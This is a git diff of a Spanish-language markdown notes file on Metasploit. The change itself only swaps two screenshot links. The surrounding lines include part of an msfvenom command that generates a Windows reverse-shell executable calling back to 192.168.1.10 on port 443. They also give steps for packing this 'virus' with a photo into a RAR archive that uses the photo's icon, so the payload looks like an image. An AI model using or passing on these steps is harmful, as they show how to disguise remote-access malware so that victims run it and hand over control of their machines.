@@ -16,15 +16,15 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=443 -f exe -o
 ---------------------------
 
 # Convertimos a rar seleccionando juntos el virus y la foto y (marcamos las siguientes casillas)
+![config](https://github.com/sav404/Metasploit-notes/assets/169759579/45910970-34fa-414c-a45a-0159ae673754)
 
-![examinar](https://github.com/sav404/Metasploit-notes/assets/169759579/08e7ee59-3455-4418-ae4d-05cd8c77c8cb)
 
 -------------------------------------
 
 # En la pestaña texto e iconos y examinamos en cargar icono desde fichero y elegimos la foto en formato .ico
 
-![config](https://github.com/sav404/Metasploit-notes/assets/169759579/45910970-34fa-414c-a45a-0159ae673754)
 
+![examinar](https://github.com/sav404/Metasploit-notes/assets/169759579/08e7ee59-3455-4418-ae4d-05cd8c77c8cb)
 
 
 # Se nos va a crear un archivo como este
